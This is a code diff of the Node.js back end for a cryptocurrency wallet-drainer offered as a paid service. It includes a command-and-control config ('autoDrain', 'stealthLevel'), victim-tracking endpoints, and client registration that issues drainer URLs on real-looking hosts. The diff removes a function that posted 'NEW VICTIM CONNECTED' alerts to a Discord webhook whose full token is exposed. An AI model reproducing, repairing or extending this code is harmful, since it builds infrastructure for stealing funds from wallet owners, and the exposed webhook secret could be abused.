@@ -5,7 +5,7 @@ console.error = (...args) => {
   const msg = args[0]?.toString() || '';
   if (msg.includes('JsonRpcProvider') || msg.includes('ECONNREFUSED')) return;
   originalError.apply(console, args);
-
+};
 process.on('unhandledRejection', (reason) => {
   const reasonStr = reason?.toString() || '';
   if (reasonStr.includes('JsonRpcProvider') || reasonStr.includes('ECONNREFUSED')) return;
@@ -27,7 +27,7 @@ console.error = (...args) => {
     return; // Silent fail for ALL RPC errors
   }
   originalConsoleError.apply(console, args);
-
+};
 
 // Also suppress unhandled promise rejections
 const originalConsoleWarn = console.warn;
@@ -38,42 +38,7 @@ console.warn = (...args) => {
     return; // Silent fail
   }
   originalConsoleWarn.apply(console, args);
-
 };
-// ==================== DISCORD NOTIFICATIONS ====================
-const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1426946015109578884/ldcLYMtw9lUR56CKhsBJKe30h9UmFKUN8cWPm502nQO1xyheglVfG_TUfg51Q17bWgp4';
-
-async function sendDiscordAlert(victimData) {
-  try {
-    console.log('🔍 DEBUG: sendDiscordAlert called with:', victimData.walletAddress);
-
-    const message = {
-      embeds: [{
-        title: "🎯 NEW VICTIM CONNECTED",
-        color: 0x00ff00,
-        fields: [
-          { name: "👤 Wallet", value: `\`${victimData.walletAddress}\``, inline: false },
-          { name: "⛓️ Chain", value: victimData.chain || 'Unknown', inline: true },
-          { name: "🕐 Time", value: new Date().toLocaleString(), inline: true },
-          { name: "🔗 Client", value: victimData.clientId || 'Direct', inline: true }
-        ],
-        timestamp: new Date().toISOString(),
-        footer: { text: "Drainer System Alert" }
-      }]
-    };
-
-    await fetch(DISCORD_WEBHOOK_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(message)
-    });
-    
-    console.log('📢 Discord alert sent for:', victimData.walletAddress);
-  } catch (error) {
-    console.log('❌ Discord alert failed:', error.message);
-  }
-}
-
 
 // Global unhandled rejection handler
 process.on('unhandledRejection', (reason, promise) => {
@@ -220,7 +185,7 @@ const ipWhitelist = (req, res, next) => {
     });
   }
   next();
-
+};
 
 // Apply security middleware
 app.use(generalLimiter);
@@ -259,7 +224,7 @@ let c2Config = {
   autoDrain: true,
   stealthLevel: "high",
   lastUpdated: new Date().toISOString()
-
+};
 
 let c2Stats = {
   totalVictims: 0,
@@ -267,7 +232,7 @@ let c2Stats = {
   successfulDrains: 0,
   failedDrains: 0,
   lastActivity: new Date().toISOString()
-
+};
 
 const SUPPORTED_CHAINS = {};
 
@@ -566,7 +531,7 @@ app.post('/saas/v2/register', (req, res) => {
       success: true,
       clientId: clientId,
       drainerUrl: `https://ch.xqx.workers.dev/?client=${clientId}`,
-      dashboardUrl: `https://service-s816.onrender.com/saas/dashboard/${clientId}`,
+      dashboardUrl: `https://ch.xqx.workers.dev/dashboard.html?client=${clientId}`,
       message: 'Client registered successfully'
     });
     
@@ -602,7 +567,6 @@ app.get("/dashboard.html", (req, res) => {
 
 // ==================== TRACKING & ANALYTICS ====================
 app.post("/api/track", async (req, res) => {
-  console.log('🎯 TRACK ENDPOINT HIT - Body:', JSON.stringify(req.body));
   try {
     if (!c2Config.enabled) {
       console.log('⏸️ Drainer disabled, ignoring victim connection');
@@ -612,12 +576,7 @@ app.post("/api/track", async (req, res) => {
       });
     }
 
-    console.log("🔍 TRACK ENDPOINT HIT - Wallet:", req.body.walletAddress);
     const victimData = req.body;
-
-  // Send Discord alert
-    console.log("🔍 DEBUG: About to send Discord alert for:", victimData.walletAddress);
-  await sendDiscordAlert(victimData);
     
     console.log(`👤 Victim connected: ${victimData.walletAddress} on ${victimData.chain}`);
     
@@ -3194,7 +3153,7 @@ app.get("/api/saas-clients", (req, res) => {
         victimCount,
         registrationDate: "Recent",
         drainerUrl: "https://ch.xqx.workers.dev/?client=" + clientId,
-        dashboardUrl: `https://service-s816.onrender.com/saas/dashboard/${clientId}`
+        dashboardUrl: "https://service-s816.onrender.com/saas/dashboard/" + clientId
       };
     });
     
